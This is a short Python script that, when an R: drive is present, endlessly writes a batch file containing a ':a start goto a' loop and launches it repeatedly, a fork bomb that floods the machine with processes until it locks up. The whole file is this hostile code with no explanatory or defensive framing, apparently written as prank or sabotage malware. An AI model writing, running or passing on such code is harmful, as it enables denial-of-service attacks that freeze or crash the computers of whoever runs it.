import os
import subprocess
import sys
import platform
import getpass
import random
import string
import re 
# Verion 5.8
username = getpass.getuser()
userid ="C:\\Users\\"
cdrive ="C:\\"
home = '/home/'
alldrives = ['%s:' % d for d in string.ascii_uppercase if os.path.exists('%s:' % d)]

def thedrive():
    if  'R:' in alldrives:
        drive = (R"R:\\")
        x = 0
        x = x + 1
        while True:
            f = open((str(drive)+str(x)+'.bat'),"w+")
            f.write("""
            :a
            start
            goto a
                    """)
            f.close
            subprocess.Popen((str(drive)+str(x)+'.bat'), shell=True)
    else:
        print("Code: 56")
    
thedrive()